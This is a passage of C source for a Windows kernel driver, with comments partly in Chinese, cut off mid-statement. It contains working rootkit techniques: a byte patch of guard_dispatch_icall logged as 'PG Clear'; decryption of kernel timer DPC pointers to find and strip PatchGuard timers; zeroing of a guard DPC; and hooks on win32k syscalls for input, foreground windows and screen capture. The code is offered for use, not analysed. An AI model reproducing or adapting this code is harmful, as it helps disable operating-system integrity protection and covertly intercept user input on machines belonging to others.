		//0x74, 0x1A, 
		//0x81, 0x38, 0x48, 0x81, 0xEC, 0xD8, 
		//0x74, 0x12, 
		//0x81, 0x38, 0x48, 0x81, 0xEC, 0x38, 
		//0x74, 0x0A, 
		//0x81, 0x38, 0x11, 0x11, 0x11, 0x11, 
		//0x74, 0x02, 
		//0xFF, 0xE0,
		//0xC3

		//0x81, 0x38, 0x2E, 0x48, 0x31, 0x11, 
		//0x74, 0x22, 
		//0x81, 0x38, 0x48, 0x31, 0x51, 0x48 ,
		//0x74, 0x1A,
		//0x81, 0x38, 0x48, 0x81, 0xEC, 0xD8, 
		//0x74, 0x12, 
		//0x81, 0x78, 0x04, 0x22, 0x22, 0x22, 0x22, 
		//0x75, 0x0A, 
		//0x81, 0x78, 0x08, 0x22, 0x22, 0x22, 0x22, 
		//0x75, 0x01, 
		//0xC3, 
		//0xFF, 0xE0

		0x81, 0x38, 0x2E, 0x48, 0x31, 0x11,
		0x74, 0x22,
		0x81, 0x38, 0x48, 0x31, 0x51, 0x48,
		0x74, 0x1A,
		0x81, 0x38, 0x11, 0x11, 0x11, 0x11,
		0x75, 0x13,
		0x81, 0x78, 0x04, 0x22, 0x22, 0x22, 0x22,
		0x75, 0x0A,
		0x81, 0x78, 0x08, 0x22, 0x22, 0x22, 0x22,
		0x75, 0x01,
		0xC3,
		0xFF, 0xE0
	};


	*(DWORD*)(&patch_code[0x12]) = KiTimerDispatch[0];
	*(DWORD*)(&patch_code[0x1B]) = KiTimerDispatch[1];
	*(DWORD*)(&patch_code[0x24]) = KiTimerDispatch[2];




	//writeSafeMemory((PVOID)(uGuard_Dispatch_Icall), patch_code, sizeof(patch_code));
	//return;



	char JPE[15] = { 0 };
	JPE[0] = (char)0x48;
	JPE[1] = (char)0xFF;
	JPE[2] = (char)0x25;
	*((INT*)&JPE[3]) = 0;

	*((DWORD64*)&JPE[7]) =  (DWORD64)gGuard_Dispatch_Icall;

	//LOG_DEBUG(" wGuard_Dispatch_Icall <%p>\n", &wGuard_Dispatch_Icall);
	JGuardDispatch = uGuard_Dispatch_Icall + 0x20;
	JGuardDispatchJGE = uGuard_Dispatch_Icall + 0x8A;
	JGuardDispatchJZ = uGuard_Dispatch_Icall + 0x31;

	//ULONGLONG __guard_retpoline_exit_indirect_rax = _CODE_GET_REAL_ADDRESS(_ASM_GET_JMP((char*)uGuard_Dispatch_Icall, 1));

	//if (__guard_retpoline_exit_indirect_rax){
	//	ULONGLONG pEtwTraceRetpolineExit = _ASM_MOV_RAX_FAR(__guard_retpoline_exit_indirect_rax, 1);
	//	if (pEtwTraceRetpolineExit)
	//	{
	//		uEtwTraceRetpolineExit = _CODE_GET_OFFSETx64(pEtwTraceRetpolineExit, 2);
	//		LOG_DEBUG("EtwTraceRetpolineExit %I64X\n", uEtwTraceRetpolineExit);
	//	}
	//}



	ReturnValue = TRUE;
	if (uGuard_Dispatch_Icall != 0) {

		if (*(DWORD64*)(uGuard_Dispatch_Icall + BEGIN_DATA) != *(DWORD64*)patch_code_Buffer) {
			return TRUE;
		}
		CODE_SIZE = sizeof(JPE);
		LOG_DEBUG("PG Clear\n");

		//KIRQL Irql = KeGetCurrentIrql();
		//KeLowerIrql(PASSIVE_LEVEL);

		writeSafeMemory((PVOID)(uGuard_Dispatch_Icall + BEGIN_DATA), JPE, 15);
		//WriteCR8(Irql);
		return TRUE;
	}
	return FALSE;
}



BOOLEAN UNLoadProcess() {


	//return TRUE;
	//HANDLE thread_handle;
	//PsCreateSystemThread(&thread_handle, THREAD_ALL_ACCESS, 0, 0, 0, server_IniHide, NULL);
	//return TRUE;
	ReturnValue = FALSE;
	//RemoveFlushDpcTimer();
	if (uGuard_Dispatch_Icall != 0) {

		if ((*(DWORD64*)(uGuard_Dispatch_Icall + BEGIN_DATA) != *(DWORD64*)patch_code_Buffer))
		{

			//KIRQL Irql = KeGetCurrentIrql();
			//KeLowerIrql(PASSIVE_LEVEL);

			bIniHideR = 0;
			writeSafeMemory((PVOID)(uGuard_Dispatch_Icall + BEGIN_DATA), patch_code_Buffer, 15);

			//WriteCR8(Irql);
			//HANDLE thread_handle;
			//PsCreateSystemThread(&thread_handle, THREAD_ALL_ACCESS, 0, 0, 0, server_IniHide, NULL);
			//LOG_DEBUG("UNLoadProcess....\n");
			return TRUE;
		}
		//return writeSafeMemory(uGuard_Dispatch_Icall + 0x10, JPE, sizeof(JPE));
	}
	return FALSE;
}

GlobalMemUser CsrssMemUser = { 0 };

void RtlInitializeAvl(PAVL_INFO pAVL) {
	RtlInitializeGenericTableAvl(&pAVL->AVL_Table, CompareHandleTablePID, AllocateHandleTablePID, FreeHandleTablePID, NULL);
	KeInitializeSpinLock(&pAVL->Lock);
}

void RtlInitializeAvlString(PAVL_INFO pAVL) {
	RtlInitializeGenericTableAvl(&pAVL->AVL_Table, CompareHandleTableEntryString,
		AllocateHandleTableEntryString, FreeHandleTableEntryString, NULL);
	KeInitializeSpinLock(&pAVL->Lock);
}




extern DWORD* MiFlags;
extern UCHAR* pPhysicalByte;
extern char* _ASM_GET_LEA_RCX(char* pAdr, int num);
extern HANDLE hPhysical;

extern KSPIN_LOCK SpinLock_MapPoiner;

KSPIN_LOCK SpinLock_MapPoinerReadWrite;

BOOLEAN  InitializeMemory() {
	__try
	{
		KeInitializeSpinLock(&SpinLock_MapPoiner);
		KeInitializeSpinLock(&SpinLock_MapPoinerReadWrite);
		DWORD64 R8 = 0x7FFFFFFFF8;
		LOG_DEBUG(" PTE_BASE <%p>\n", PTE_BASE);
		PDE_BASE = ((PTE_BASE >> 9) & R8) + PTE_BASE;
		LOG_DEBUG(" PDE_BASE <%p>\n", PDE_BASE);
		PPE_BASE = ((PDE_BASE >> 9) & R8) + PTE_BASE;
		LOG_DEBUG(" PPE_BASE <%p>\n", PPE_BASE);
		PXE_BASE = ((PPE_BASE >> 9) & R8) + PTE_BASE;
		LOG_DEBUG(" PXE_BASE <%p>\n", PXE_BASE);
		PXE_SELFMAP = ((PXE_BASE >> 9) & R8) + PTE_BASE;
		LOG_DEBUG(" PXE_SELFMAP <%p>\n", PXE_SELFMAP);

		MiFlags =  (DWORD *)((ULONGLONG)PsProcessType - 0x10);
		//LOG_DEBUG("PsProcessType <%p> <%p>\n", PsProcessType, &PsProcessType);
		LOG_DEBUG("uMiFlags <%p> %I64X\n", MiFlags, *(DWORD64*)MiFlags);


		LOG_DEBUG("PTE_BASE <%p>\n", PTE_BASE);

		//UNICODE_STRING fName = RTL_CONSTANT_STRING(L"MmGetPhysicalAddress");
		ULONGLONG uMmGetPhysicalAddress = GetProcAddress_Kernel(kernelBase, "MmGetPhysicalAddress");// (ULONGLONG)MmGetSystemRoutineAddress(&fName);
		if (uMmGetPhysicalAddress != 0)
		{
			LOG_DEBUG("uMmGetPhysicalAddress <%p>\n", uMmGetPhysicalAddress);


			ULONGLONG uMiGetPhysicalAddress = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)uMmGetPhysicalAddress, 1));
			if (uMiGetPhysicalAddress != 0)
			{
				LOG_DEBUG("uMiGetPhysicalAddress <%p>\n", uMiGetPhysicalAddress);
				//	ULONGLONG uMI_IS_PHYSICAL_ADDRESS = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)uMiGetPhysicalAddress, 2));
				ULONGLONG uMiGetSystemRegionType = _CODE_GET_REAL_ADDRESS(_ASM_GET_CALL((char*)uMiGetPhysicalAddress, 7));
				if (uMiGetSystemRegionType != 0)
				{
					LOG_DEBUG("uMiGetSystemRegionType <%p>\n", uMiGetSystemRegionType);
					pPhysicalByte = (UCHAR *)_CODE_GET_REAL_ADDRESS_0(_ASM_GET_LEA_RCX((char *)uMiGetSystemRegionType, 1), 3);
					if (pPhysicalByte != 0)
					{
						LOG_DEBUG("pPhysicalByte <%p>\n", pPhysicalByte);
						return TRUE;
					}
				}
			}
		}
		return FALSE;
	}
	__except (1) {

		LOG_DEBUG("_except %s %08X\n", __FUNCTION__, GetExceptionCode());

	}



	return FALSE;
}





//unsigned int SystemCallIndex, void** SystemCallFunction
void __fastcall CALL_BACK(unsigned int Index, void** pAddress) {


	//LOG_DEBUG("_HOOK %d  Kenerl\n", Index);
	if (Index == NtUserCallTwoParamIndex && NtUserCallTwoParamIndex != 0xFFFFFFFF)
	{
		// TrueNtUserCallTwoParam = *pAddress;
		*pAddress = Br_NtUserCallTwoParam;
		LOG_DEBUG("_HOOK %d  NtUserCallTwoParam\n", Index);
		return;
	}
	else if (Index == NtUserGetThreadStateIndex && NtUserGetThreadStateIndex != 0xFFFFFFFF) {

		//  TrueNtUserGetThreadState = *pAddress;
		*pAddress = Br_NtUserGetThreadState;
		LOG_DEBUG("_HOOK %d   NtUserGetThreadState\n", Index);
		return;

	}
	else if (Index == NtUserGetForegroundWindowIndex && NtUserGetForegroundWindowIndex != 0xFFFFFFFF) {

		//TrueNtUserGetForegroundWindow = *pAddress;
		*pAddress = Br_NtUserGetForegroundWindow;
		LOG_DEBUG("_HOOK %d  TrueNtUserGetForegroundWindow\n", Index);
		return;
	}
	else if (Index == NtUserGetRawInputDataIndex && NtUserGetRawInputDataIndex != 0xFFFFFFFF) {

		//TrueNtUserGetRawInputData = *pAddress;
		*pAddress = Br_NtUserGetRawInputData;
		LOG_DEBUG("_HOOK %d  NtUserGetRawInputData\n", Index);
		return;
	}
	else if (Index == NtUserWindowFromPointIndex && NtUserWindowFromPointIndex != 0xFFFFFFFF) {

		// TrueNtUserWindowFromPoint = *pAddress;
		*pAddress = Br_NtUserWindowFromPoint;
		LOG_DEBUG("_HOOK %d  NtUserWindowFromPoint\n", Index);
		return;
	}

	//LOG_DEBUG("_HOOK %d\n", Index);
}










extern char* _ASM_MOV_EAX_2(char* pAdr, int num);

_Win32k_NtUserGetThreadState Win32k_NtUserGetThreadState = 0;
_Win32k_NtUserCallHwndLock Win32k_NtUserCallHwndLock = 0;
_Win32k_NtUserSendInput  Win32k_NtUserSendInput = 0;
_Win32k_NtUserCallTwoParam  Win32k_NtUserCallTwoParam = 0;
_Win32k_NtUserCallOneParam  Win32k_NtUserCallOneParam = 0;
_Win32k_NtUserFindWindowEx Win32k_NtUserFindWindowEx = 0;
_Win32k_NtUserGetForegroundWindow Win32k_NtUserGetForegroundWindow = 0;
_Win32k_NtUserSetWindowLongPtr Win32k_NtUserSetWindowLongPtr = 0;
_Win32k_NtUserPostMessage Win32k_NtUserPostMessage = 0;

_Win32k_NtUserCloseClipboard Win32k_NtUserCloseClipboard = 0;
_Win32k_NtUserOpenClipboard Win32k_NtUserOpenClipboard = 0;
_Win32k_NtUserSetClipboardData Win32k_NtUserSetClipboardData = 0;
_Win32k_NtUserGetClipboardData Win32k_NtUserGetClipboardData = 0;

_Win32k_NtUserConvertMemHandle Win32k_NtUserConvertMemHandle = 0;
_Win32k_NtUserCreateLocalMemHandle Win32k_NtUserCreateLocalMemHandle = 0;
_Win32k_NtUserEmptyClipboard Win32k_NtUserEmptyClipboard = 0;
_Win32k_NtUserEnumDisplaySettings Win32k_NtUserEnumDisplaySettings = 0;

//----------  GDI PICTURE



_win32k_NtUserGetDC Win32k_NtUserGetDC = 0;

_win32k_NtGdiCreateCompatibleBitmap Win32k_NtGdiCreateCompatibleBitmap = 0;

_win32k_NtGdiCreateCompatibleDC Win32k_NtGdiCreateCompatibleDC = 0;

_win32k_NtGdiBitBlt Win32k_NtGdiBitBlt = 0;

_win32k_NtGdiSelectBitmap Win32k_NtGdiSelectBitmap = 0;

_win32k_NtUserReleaseDC Win32k_NtUserReleaseDC = 0;

_win32k_NtGdiExtGetObjectW Win32k_NtGdiExtGetObjectW = 0;

_win32k_NtGdiGetBitmapBits Win32k_NtGdiGetBitmapBits = 0;

//_Win32k_



//----------  Win32kBase

_Win32k_ValidateHwnd  Win32k_ValidateHwnd = 0;;



HANDLE Win32k_Process_Explorer = 0;
char* Win32k_Process_Explorer_Buffer = 0;

DWORD SET_FORE_WINDW = 0;

DWORD GET_tagHNW = 0;





extern ULONG_PTR Win32kBase;
extern ULONG_PTR Win32kBaseBase;
extern ULONG_PTR Win32kBaseFull;







void* GetWin32kAddress(char* Name) {

	void* fAddress = 0;
	if (Win32kBase != 0)
	{
		fAddress = GetProcAddress_Kernel((PVOID)Win32kBase, Name);
		if (fAddress == 0 && (Win32kBaseFull != 0)) {
			fAddress = GetProcAddress_Kernel((PVOID)Win32kBaseFull, Name);
			if (fAddress == 0 && (Win32kBaseBase != 0)) {
				fAddress = GetProcAddress_Kernel((PVOID)Win32kBaseBase, Name);
			}
		}

	}
	return fAddress;
}


#define  WIN32K_FUN(X) Win32k_##X = GetWin32kAddress(#X);\
             LOG_DEBUG("Win32k "#X "<%p>\n", Win32k_##X);


void FlshWin32kShow() {

	WIN32K_FUN(NtUserEnumDisplaySettings)

	WIN32K_FUN(ValidateHwnd);

	WIN32K_FUN(NtUserCallOneParam);

	WIN32K_FUN(NtUserGetThreadState);

	WIN32K_FUN(NtUserPostMessage);

	WIN32K_FUN(NtUserCallHwndLock);

	WIN32K_FUN(NtUserGetForegroundWindow);

	WIN32K_FUN(NtUserSetWindowLongPtr);

	WIN32K_FUN(NtUserFindWindowEx);

	WIN32K_FUN(NtUserSendInput);

	WIN32K_FUN(NtUserCloseClipboard);

	WIN32K_FUN(NtUserOpenClipboard);

	WIN32K_FUN(NtUserSetClipboardData);

	WIN32K_FUN(NtUserCreateLocalMemHandle);

	WIN32K_FUN(NtUserEmptyClipboard);

	WIN32K_FUN(NtUserGetClipboardData);

	WIN32K_FUN(NtUserConvertMemHandle);

	WIN32K_FUN(NtUserSetWindowLongPtr);


	WIN32K_FUN(NtUserGetDC); // win32k_NtUserGetDC = 0;

	WIN32K_FUN(NtGdiCreateCompatibleBitmap);//_win32k_NtGdiCreateCompatibleBitmap win32k_NtGdiCreateCompatibleBitmap = 0;

	WIN32K_FUN(NtGdiCreateCompatibleDC);//_win32k_NtGdiCreateCompatibleDC win32k_NtGdiCreateCompatibleDC = 0;

	WIN32K_FUN(NtGdiBitBlt);//_win32k_NtGdiBitBlt win32k_NtGdiBitBlt = 0;

	WIN32K_FUN(NtGdiSelectBitmap);//_win32k_NtGdiSelectBitmap win32k_NtGdiSelectBitmap = 0;


	WIN32K_FUN(NtUserReleaseDC);//_win32k_NtUserReleaseDC Win32k_NtUserReleaseDC = 0;

	WIN32K_FUN(NtGdiExtGetObjectW);//_win32k_NtGdiExtGetObjectW Win32k_NtGdiExtGetObjectW = 0;
	
	WIN32K_FUN(NtGdiGetBitmapBits);


	if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 1)
	{
		SET_FORE_WINDW = 0x73;
		GET_tagHNW = 58;
	}
	else if (OsVersion.dwBuildNumber >= 17763 && OsVersion.dwBuildNumber < 18362) {

		SET_FORE_WINDW = 0x73;
		GET_tagHNW = 58;
	}
	else if (OsVersion.dwBuildNumber >= 18362 && OsVersion.dwBuildNumber < 19041) {
		SET_FORE_WINDW = 0x73;
		GET_tagHNW = 58;
	}
	else if (OsVersion.dwBuildNumber >= 19041 && OsVersion.dwBuildNumber < 20384) {
		SET_FORE_WINDW = 0x70;
		GET_tagHNW = 56;
	}
	else
	{
		SET_FORE_WINDW = 0x70;
		GET_tagHNW = 56;
	}




	//if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 1)
	//{
	//	//GlobalAlloc()


	//}
	//else if (OsVersion.dwBuildNumber >= 17763 && OsVersion.dwBuildNumber < 18362) {

	//	Win32k_NtUserGetThreadState = (_Win32k_NtUserGetThreadState)GetSSDTSHOWFuncAddr(3);
	//	Win32k_NtUserPostMessage = (_Win32k_NtUserPostMessage)GetSSDTSHOWFuncAddr(18);
	//	Win32k_NtUserCallHwndLock = (_Win32k_NtUserCallHwndLock)GetSSDTSHOWFuncAddr(36);
	//	SET_FORE_WINDW = 0x73;
	//	Win32k_NtUserGetForegroundWindow = (_Win32k_NtUserGetForegroundWindow)GetSSDTSHOWFuncAddr(63);
	//	Win32k_NtUserFindWindowEx = (_Win32k_NtUserFindWindowEx)GetSSDTSHOWFuncAddr(111);
	//	Win32k_NtUserSendInput = (_Win32k_NtUserSendInput)GetSSDTSHOWFuncAddr(130);

	//	Win32k_NtUserCloseClipboard = (_Win32k_NtUserCloseClipboard)GetSSDTSHOWFuncAddr(197);
	//	Win32k_NtUserOpenClipboard = (_Win32k_NtUserOpenClipboard)GetSSDTSHOWFuncAddr(198);
	//	Win32k_NtUserSetClipboardData = (_Win32k_NtUserSetClipboardData)GetSSDTSHOWFuncAddr(199);

	//	Win32k_NtUserCreateLocalMemHandle =(_Win32k_NtUserCreateLocalMemHandle)GetSSDTSHOWFuncAddr(225);

	//	Win32k_NtUserEmptyClipboard = (_Win32k_NtUserEmptyClipboard)GetSSDTSHOWFuncAddr(238);
	//	Win32k_NtUserGetClipboardData = (_Win32k_NtUserGetClipboardData)GetSSDTSHOWFuncAddr(239);
	//	Win32k_NtUserConvertMemHandle = (_Win32k_NtUserConvertMemHandle)GetSSDTSHOWFuncAddr(243);
	//	Win32k_NtUserSetWindowLongPtr = (_Win32k_NtUserSetWindowLongPtr)GetSSDTSHOWFuncAddr(1241);
	//}
	//else if (OsVersion.dwBuildNumber >= 18362 && OsVersion.dwBuildNumber < 19041) {

	//	Win32k_NtUserGetThreadState = (_Win32k_NtUserGetThreadState)GetSSDTSHOWFuncAddr(3);
	//	Win32k_NtUserPostMessage = (_Win32k_NtUserPostMessage)GetSSDTSHOWFuncAddr(18);
	//	Win32k_NtUserCallHwndLock = (_Win32k_NtUserCallHwndLock)GetSSDTSHOWFuncAddr(36);
	//	SET_FORE_WINDW = 0x73;
	//	Win32k_NtUserGetForegroundWindow = (_Win32k_NtUserGetForegroundWindow)GetSSDTSHOWFuncAddr(63);
	//	Win32k_NtUserFindWindowEx = (_Win32k_NtUserFindWindowEx)GetSSDTSHOWFuncAddr(111);
	//	Win32k_NtUserSendInput = (_Win32k_NtUserSendInput)GetSSDTSHOWFuncAddr(130);

	//	Win32k_NtUserCloseClipboard = (_Win32k_NtUserCloseClipboard)GetSSDTSHOWFuncAddr(197);
	//	Win32k_NtUserOpenClipboard = (_Win32k_NtUserOpenClipboard)GetSSDTSHOWFuncAddr(198);
	//	Win32k_NtUserSetClipboardData = (_Win32k_NtUserSetClipboardData)GetSSDTSHOWFuncAddr(199);

	//	Win32k_NtUserCreateLocalMemHandle = (_Win32k_NtUserCreateLocalMemHandle)GetSSDTSHOWFuncAddr(225);

	//	Win32k_NtUserEmptyClipboard = (_Win32k_NtUserEmptyClipboard)GetSSDTSHOWFuncAddr(238);
	//	Win32k_NtUserGetClipboardData = (_Win32k_NtUserGetClipboardData)GetSSDTSHOWFuncAddr(239);
	//	Win32k_NtUserConvertMemHandle = (_Win32k_NtUserConvertMemHandle)GetSSDTSHOWFuncAddr(243);

	//	Win32k_NtUserSetWindowLongPtr = (_Win32k_NtUserSetWindowLongPtr)GetSSDTSHOWFuncAddr(1257);
	//}
	//else if (OsVersion.dwBuildNumber >= 19041 && OsVersion.dwBuildNumber < 20384) {

	//	Win32k_NtUserGetThreadState = (_Win32k_NtUserGetThreadState)GetSSDTSHOWFuncAddr(0);
	//	Win32k_NtUserPostMessage = (_Win32k_NtUserPostMessage)GetSSDTSHOWFuncAddr(15);
	//	Win32k_NtUserCallHwndLock = (_Win32k_NtUserCallHwndLock)GetSSDTSHOWFuncAddr(33);
	//	SET_FORE_WINDW = 0x70;
	//	Win32k_NtUserGetForegroundWindow = (_Win32k_NtUserGetForegroundWindow)GetSSDTSHOWFuncAddr(60);
	//	Win32k_NtUserFindWindowEx = (_Win32k_NtUserFindWindowEx)GetSSDTSHOWFuncAddr(108);
	//	Win32k_NtUserSendInput = (_Win32k_NtUserSendInput)GetSSDTSHOWFuncAddr(127);

	//	Win32k_NtUserCloseClipboard = (_Win32k_NtUserCloseClipboard)GetSSDTSHOWFuncAddr(194);
	//	Win32k_NtUserOpenClipboard = (_Win32k_NtUserOpenClipboard)GetSSDTSHOWFuncAddr(195);
	//	Win32k_NtUserSetClipboardData = (_Win32k_NtUserSetClipboardData)GetSSDTSHOWFuncAddr(196);


	//	Win32k_NtUserCreateLocalMemHandle = (_Win32k_NtUserCreateLocalMemHandle)GetSSDTSHOWFuncAddr(222);


	//	Win32k_NtUserEmptyClipboard = (_Win32k_NtUserEmptyClipboard)GetSSDTSHOWFuncAddr(235);
	//	Win32k_NtUserGetClipboardData = (_Win32k_NtUserGetClipboardData)GetSSDTSHOWFuncAddr(236);

	//	Win32k_NtUserConvertMemHandle = (_Win32k_NtUserConvertMemHandle)GetSSDTSHOWFuncAddr(240);

	//	Win32k_NtUserSetWindowLongPtr = (_Win32k_NtUserSetWindowLongPtr)GetSSDTSHOWFuncAddr(1315);
	//}






}


extern NTSTATUS FindProcessID(UNICODE_STRING* ProcessName, DWORD* pSize, DWORD* ProcessArry);



VOID GetDeviceInfoV(PDEVICE_OBJECT pDevObj)
{
	NTSTATUS status = STATUS_SUCCESS;
	PDEVICE_OBJECT pCurDevObj = pDevObj;
	POBJECT_NAME_INFORMATION pObjNameInfo = NULL;
	ULONG Length = 0;

	pObjNameInfo = (POBJECT_NAME_INFORMATION)ExAllocatePool(PagedPool, sizeof(OBJECT_NAME_INFORMATION));


	while (pCurDevObj != NULL)
	{
		RtlZeroMemory(pObjNameInfo, sizeof(OBJECT_NAME_INFORMATION));
		status = ObQueryNameString(pCurDevObj, pObjNameInfo, sizeof(OBJECT_NAME_INFORMATION), &Length);
		if (NT_SUCCESS(status))
		{
			LOG_DEBUG("驱动对象%p:%wZ\t设备对象%p:%wZ\n",
				pCurDevObj->DriverObject,
				&pCurDevObj->DriverObject->DriverName,
				pCurDevObj,
				&pObjNameInfo->Name);
		}
		else
		{
			LOG_DEBUG("驱动对象%p:%wZ\t设备对象%p\n",
				pCurDevObj->DriverObject,
				&pCurDevObj->DriverObject->DriverName,
				pCurDevObj);
		}

		pCurDevObj = pCurDevObj->AttachedDevice;
	}

	ExFreePool(pObjNameInfo);
}


// 枚举驱动
VOID EnumDriver()
{
	NTSTATUS status = STATUS_SUCCESS;
	UNICODE_STRING DriverName = { 0 };
	PDRIVER_OBJECT pDriverObj = NULL;
	PDEVICE_OBJECT pCurDevObj = NULL;

	RtlInitUnicodeString(&DriverName, L"\\Driver\\Null");

	status = ObReferenceObjectByName(&DriverName,
		OBJ_CASE_INSENSITIVE,
		NULL,
		FILE_ANY_ACCESS,
		*IoDriverObjectType,
		KernelMode,
		NULL,
		&pDriverObj);
	if (NT_SUCCESS(status))
	{


		EnumDrvs(pDriverObj, &DriverName);

		//pCurDevObj = pDriverObj->DeviceObject;
		//while (pCurDevObj != NULL)
		//{
		//	GetDeviceInfoV(pCurDevObj);
		//	pCurDevObj = pCurDevObj->NextDevice;
		//}
	}
	//else
	//{
	//	LOG_DEBUG("Can't Find Null\n");
	//}

}




BOOLEAN FindZeroMemory(int PageSize, PVOID* hMod, PVOID* NewMod) {

	NTSTATUS status = STATUS_SUCCESS;
	UNICODE_STRING DriverName = { 0 };
	PDRIVER_OBJECT pDriverObj = NULL;
	PDEVICE_OBJECT pCurDevObj = NULL;

	RtlInitUnicodeString(&DriverName, L"\\Driver\\Null");

	status = ObReferenceObjectByName(&DriverName,
		OBJ_CASE_INSENSITIVE,
		NULL,
		FILE_ANY_ACCESS,
		*IoDriverObjectType,
		KernelMode,
		NULL,
		&pDriverObj);
	if (NT_SUCCESS(status))
	{
		return FindPageNew(pDriverObj, PageSize, hMod, NewMod);
	}
	return FALSE;
}



extern char* _ASM_MOV_RSI_2(char* pAdr, int num);

extern char* _ASM_MOV_RAX_2(char* pAdr, int num);



char* _ASM_SAR_RAX(char* pAdr, int num) {
	int bi = 0;
	int gLen = 0;
	while (bi < num)
	{
		int bLen = DetourGetInstructionLength(pAdr + gLen);
		if (bLen == 4) {
			char* p = pAdr + gLen;
			if (p[0] == (char)0x48 &&
				p[1] == (char)0xC1 &&
				p[2] == (char)0xF8) {
				bi++;
				if (bi == num)
				{
					break;
				}
			}
		}
		if (bLen == 0)
		{
			LOG_DEBUG("are you sure blen == 0\n");
			return 0;
		}
		gLen += bLen;
		if (gLen > 0x1000)
		{
			LOG_DEBUG("glen >= 0x1000\n");
			return 0;
		}
	}
	return pAdr + gLen;
}



typedef struct _KTIMER_TABLE_ENTRY
{
	ULONG_PTR   Lock;
	LIST_ENTRY  Entry;
	ULONG_PTR   Time;
}KTIMER_TABLE_ENTRY, * PKTIMER_TABLE_ENTRY;

typedef struct _KTIMER_TABLE
{
	ULONG_PTR           TimerExpiry[64];
	KTIMER_TABLE_ENTRY  TimerEntries[256];
}KTIMER_TABLE, * PKTIMER_TABLE;


extern DWORD64 KernelBaseSize;


DWORD TimerTableOffset = 0;


void RemoveFlushDpcTimer() {

	OsVersion.dwOSVersionInfoSize = sizeof(OsVersion);
	RtlGetVersion((PRTL_OSVERSIONINFOW)&OsVersion);
	if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 1)
	{
		TimerTableOffset = 0;
	}
	else if (OsVersion.dwBuildNumber >= 17763 && OsVersion.dwBuildNumber < 18362) {

		TimerTableOffset = 0x3680;
	}
	else if (OsVersion.dwBuildNumber >= 18362 && OsVersion.dwBuildNumber < 19041) {
		TimerTableOffset = 0x3680;
	}
	else if (OsVersion.dwBuildNumber >= 19041 && OsVersion.dwBuildNumber < 20384) {
		TimerTableOffset = 0x3940;
	}


	UNICODE_STRING  uc_KeSetTimer = { 0 };
	RtlInitUnicodeString(&uc_KeSetTimer, L"KeSetTimerEx");




	UNICODE_STRING  uc_Memset = { 0 };

	RtlInitUnicodeString(&uc_Memset, L"memset");
	
	DWORD64 pMemset = GetProcAddress_Kernel(kernelBase, "memset");


	LOG_DEBUG(" Memset <%p>\n" , pMemset);

	char* CodeBegin = GetProcAddress_Kernel(kernelBase, "KeSetTimerEx");


	DWORD64* KiWaitNever = _CODE_GET_REAL_ADDRESS_0(_ASM_MOV_RAX_2(CodeBegin, 1), 3);
	DWORD64* KiWaitAlways = _CODE_GET_REAL_ADDRESS_0(_ASM_MOV_RSI_2(CodeBegin, 1), 3);

	LOG_DEBUG("KiWaitNever  %I64X    KiWaitAlways %I64X\n", KiWaitNever, KiWaitAlways);

	if (!KiWaitAlways || !KiWaitAlways)
	{
		//LOG_DEBUG("KiWaitNever  %I64X    KiWaitAlways %I64X  End 01 \n", KiWaitNever, KiWaitAlways);
		return;
	}
	
	if (!MmIsAddressValid(KiWaitAlways) || !MmIsAddressValid(KiWaitNever))
	{
		//LOG_DEBUG("KiWaitNever  %I64X    KiWaitAlways %I64X  End 02 \n", KiWaitNever, KiWaitAlways);
		return;
	}


	INT i_cpuNum = KeNumberProcessors;

	for (KAFFINITY i = 0; i < i_cpuNum; i++)
	{
		// 线程绑定特定 CPU
		KeSetSystemAffinityThread(i + 1);

		// 获得 KPRCB 的地址
		ULONG64 p_PRCB = (ULONG64)__readmsr(0xC0000101) + 0x20;
		if (!MmIsAddressValid((PVOID64)p_PRCB))
		{
			//LOG_DEBUG("KiWaitNever  %I64X    KiWaitAlways %I64X\n", KiWaitNever, KiWaitAlways);
			return FALSE;
		}
		

		// 取消绑定 CPU
		KeRevertToUserAffinityThread();


	
		// 计算 TimerTable 在 _KPRCB 结构中的偏移
		PKTIMER_TABLE p_TimeTable = NULL;

		// Windows 10 得到_KPRCB + 0x3680

		if (TimerTableOffset == 0)
		{
			return;
		}

		p_TimeTable = (PKTIMER_TABLE)(*(PULONG64)p_PRCB + TimerTableOffset);

		DWORD64  *GuardDpc = (*(PULONG64)p_PRCB + 0x80);

		*GuardDpc = 0;

		// 遍历 TimerEntries[] 数组（大小 256）
		for (INT j = 0; j < 256; j++)
		{
			// 获取 Entry 双向链表地址
			if (!MmIsAddressValid((PVOID64)p_TimeTable))
			{
				continue;
			}

			PLIST_ENTRY p_ListEntryHead = &(p_TimeTable->TimerEntries[j].Entry);

			// 遍历 Entry 双向链表
			for (PLIST_ENTRY p_ListEntry = p_ListEntryHead->Flink; p_ListEntry != p_ListEntryHead; p_ListEntry = p_ListEntry->Flink)
			{
				// 根据 Entry 取 _KTIMER 对象地址
				if (!MmIsAddressValid((PVOID64)p_ListEntry))
				{
					continue;
				}

				PKTIMER p_Timer = CONTAINING_RECORD(p_ListEntry, KTIMER, TimerListEntry);

				// 硬编码取 KiWaitNever 和 KiWaitAlways 
				//ULONG64 never = 0, always = 0;
				//if (get_KiWait(&never, &always) == FALSE)
				//{
				//	return FALSE;
				//}


				//LARGE_INTEGER

				// 获取解密前的 Dpc 对象
				if (!MmIsAddressValid((PVOID64)p_Timer))
				{
					continue;
				}

				ULONG64 ul_Dpc = (ULONG64)p_Timer->Dpc;
				INT i_Shift = (*((PULONG64)KiWaitNever) & 0xFF);

				// 解密 Dpc 对象
				ul_Dpc ^= *((ULONG_PTR*)KiWaitNever);         // 异或
				ul_Dpc = _rotl64(ul_Dpc, i_Shift);      // 循环左移
				ul_Dpc ^= (ULONG_PTR)p_Timer;           // 异或
				ul_Dpc = _byteswap_uint64(ul_Dpc);      // 颠倒顺序
				ul_Dpc ^= *((ULONG_PTR*)KiWaitAlways);        // 异或

				// 对象类型转换
				PKDPC p_Dpc = (PKDPC)ul_Dpc;

				// 打印验证
				if (!MmIsAddressValid((PVOID64)p_Dpc))
				{
					continue;
				}
				//LOG_DEBUG("定时器对象：0x%p | 函数入口：ntos + 0x%p | 触发周期: %d \n ", p_Timer,   (DWORD64)p_Dpc->DeferredRoutine - (DWORD64)kernelBase, p_Timer->Period);
				//WORK_QUEUE_TYPE
				if ((DWORD64)p_Dpc->DeferredRoutine >  (DWORD64)kernelBase  && 
